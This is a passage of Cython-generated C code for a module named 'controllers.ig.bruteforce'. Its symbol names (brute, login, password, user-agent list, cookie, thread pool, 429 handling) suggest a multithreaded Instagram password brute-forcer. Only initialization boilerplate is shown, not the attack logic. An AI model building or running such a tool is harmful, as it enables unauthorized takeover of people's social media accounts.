  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_kp_u_pensive_face_Tidak_ada_daftar_I); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

   
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u_Menampilkan_informasi_akun_pada); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

   
  __pyx_slice__8 = PySlice_New(__pyx_int_0, __pyx_int_5, Py_None); if (unlikely(!__pyx_slice__8)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__8);
  __Pyx_GIVEREF(__pyx_slice__8);

   
  __pyx_tuple__9 = PyTuple_Pack(5, __pyx_n_s_thread, __pyx_n_s_task, __pyx_n_s_status, __pyx_n_s_description, __pyx_n_s_current); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 79, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);
  __pyx_codeobj__10 = (PyObject*)__Pyx_PyCode_New(3, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__9, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_loading, 79, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__10)) __PYX_ERR(0, 79, __pyx_L1_error)

   
  __pyx_tuple__11 = PyTuple_Pack(6, __pyx_n_s_data, __pyx_n_s_kwargs, __pyx_n_s_task, __pyx_n_s_status, __pyx_n_s_pool, __pyx_n_s_target); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);
  __pyx_codeobj__12 = (PyObject*)__Pyx_PyCode_New(4, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__11, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_normal, 94, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__12)) __PYX_ERR(0, 94, __pyx_L1_error)

   
  __pyx_tuple__13 = PyTuple_Pack(8, __pyx_n_s_data, __pyx_n_s_kwargs, __pyx_n_s_task, __pyx_n_s_status, __pyx_n_s_ualist, __pyx_n_s_pool, __pyx_n_s_item, __pyx_n_s_target); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);
  __pyx_codeobj__14 = (PyObject*)__Pyx_PyCode_New(4, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__13, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_randoms, 102, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__14)) __PYX_ERR(0, 102, __pyx_L1_error)

   
  __pyx_tuple__15 = PyTuple_Pack(1, __pyx_kp_u_Mempersiapkan); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 115, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

   
  __pyx_tuple__17 = PyTuple_Pack(2, __pyx_int_190000, __pyx_int_200000); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

   
  __pyx_tuple__19 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);
  __pyx_codeobj__20 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__19, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_init, 26, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__20)) __PYX_ERR(0, 26, __pyx_L1_error)

   
  __pyx_tuple__21 = PyTuple_Pack(26, __pyx_n_s_self, __pyx_n_s_rich, __pyx_n_s_i, __pyx_n_s_users, __pyx_n_s_kwargs, __pyx_n_s_password_used, __pyx_n_s_random_user_agent, __pyx_n_s_saved, __pyx_n_s_tips, __pyx_n_s_progress, __pyx_n_s_chunk, __pyx_n_s_target, __pyx_n_s_account, __pyx_n_s_data, __pyx_n_s_loading, __pyx_n_s_loading, __pyx_n_s_normal, __pyx_n_s_normal, __pyx_n_s_randoms, __pyx_n_s_randoms, __pyx_n_s_start_time, __pyx_n_s_status, __pyx_n_s_task, __pyx_n_s_thread, __pyx_n_s_end_time, __pyx_n_s_minutes); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);
  __pyx_codeobj__22 = (PyObject*)__Pyx_PyCode_New(1, 0, 26, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__21, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_start, 34, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__22)) __PYX_ERR(0, 34, __pyx_L1_error)

   
  __pyx_tuple__23 = PyTuple_Pack(8, __pyx_n_s_self, __pyx_n_s_username, __pyx_n_s_cookie, __pyx_n_s_results, __pyx_n_s_http, __pyx_n_s_num_retries, __pyx_n_s_response, __pyx_n_s_user); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);
  __pyx_codeobj__24 = (PyObject*)__Pyx_PyCode_New(3, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__23, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_profile_channel, 127, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__24)) __PYX_ERR(0, 127, __pyx_L1_error)
  __pyx_tuple__25 = PyTuple_Pack(1, ((PyObject *)Py_None)); if (unlikely(!__pyx_tuple__25)) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__25);
  __Pyx_GIVEREF(__pyx_tuple__25);

   
  __pyx_tuple__26 = PyTuple_Pack(10, __pyx_n_s_self, __pyx_n_s_username, __pyx_n_s_cookie, __pyx_n_s_results, __pyx_n_s_http, __pyx_n_s_num_retries, __pyx_n_s_response, __pyx_n_s_shared_data, __pyx_n_s_json_object, __pyx_n_s_form_data); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);
  __pyx_codeobj__27 = (PyObject*)__Pyx_PyCode_New(3, 0, 10, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__26, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_my_profile, 159, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__27)) __PYX_ERR(0, 159, __pyx_L1_error)

   
  __pyx_tuple__28 = PyTuple_Pack(10, __pyx_n_s_self, __pyx_n_s_users, __pyx_n_s_kwargs, __pyx_n_s_rich, __pyx_n_s_password, __pyx_n_s_login, __pyx_n_s_cookie, __pyx_n_s_profile, __pyx_n_s_root, __pyx_n_s_account); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);
  __pyx_codeobj__29 = (PyObject*)__Pyx_PyCode_New(2, 0, 10, 0, CO_OPTIMIZED|CO_NEWLOCALS|CO_VARKEYWORDS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__28, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_brute, 225, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__29)) __PYX_ERR(0, 225, __pyx_L1_error)

   
  __pyx_tuple__30 = PyTuple_Pack(10, __pyx_n_s_self, __pyx_n_s_username, __pyx_n_s_password, __pyx_n_s_retries, __pyx_n_s_user_agent, __pyx_n_s_results, __pyx_n_s_http, __pyx_n_s_response, __pyx_n_s_payload, __pyx_n_s_cookie); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);
  __pyx_codeobj__31 = (PyObject*)__Pyx_PyCode_New(5, 0, 10, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__30, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_mtf_app_controllers_ig_bruteforc, __pyx_n_s_login, 294, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__31)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  __pyx_umethod_PyDict_Type_update.type = (PyObject*)&PyDict_Type;
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_5 = PyInt_FromLong(5); if (unlikely(!__pyx_int_5)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_25 = PyInt_FromLong(25); if (unlikely(!__pyx_int_25)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_123 = PyInt_FromLong(123); if (unlikely(!__pyx_int_123)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_429 = PyInt_FromLong(429); if (unlikely(!__pyx_int_429)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_12345 = PyInt_FromLong(12345L); if (unlikely(!__pyx_int_12345)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_190000 = PyInt_FromLong(190000L); if (unlikely(!__pyx_int_190000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_200000 = PyInt_FromLong(200000L); if (unlikely(!__pyx_int_200000)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void);  
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void);  
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void);  
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void);  
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void);  
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void);  
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void);  

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
   
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
   
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
   
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
   
  if (PyType_Ready(&__pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start) < 0) __PYX_ERR(0, 34, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start.tp_dictoffset && __pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start = &__pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
   
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
   
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
   
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initbruteforce(void) CYTHON_SMALL_CODE;  
__Pyx_PyMODINIT_FUNC initbruteforce(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_bruteforce(void) CYTHON_SMALL_CODE;  
__Pyx_PyMODINIT_FUNC PyInit_bruteforce(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_bruteforce(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'bruteforce' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_bruteforce(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
   
   
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
   
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("bruteforce", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
   
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_controllers__ig__bruteforce____init__) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  if (!CYTHON_PEP489_MULTI_PHASE_INIT) {
    if (unlikely(__Pyx_SetPackagePathFromImportLib(__pyx_kp_u_controllers_ig_bruteforce___init) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "controllers.ig.bruteforce")) {
      if (unlikely(PyDict_SetItemString(modules, "controllers.ig.bruteforce", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
   
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
   
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
   
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
   
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

   
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_re, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_1) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_traceback, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_traceback, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_app);
  __Pyx_GIVEREF(__pyx_n_s_app);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_app);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_mtf_config, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_app); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_app, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Http);
  __Pyx_GIVEREF(__pyx_n_s_Http);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Http);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_mtf_module_http_bs4, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Http); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Http, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);
  __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);
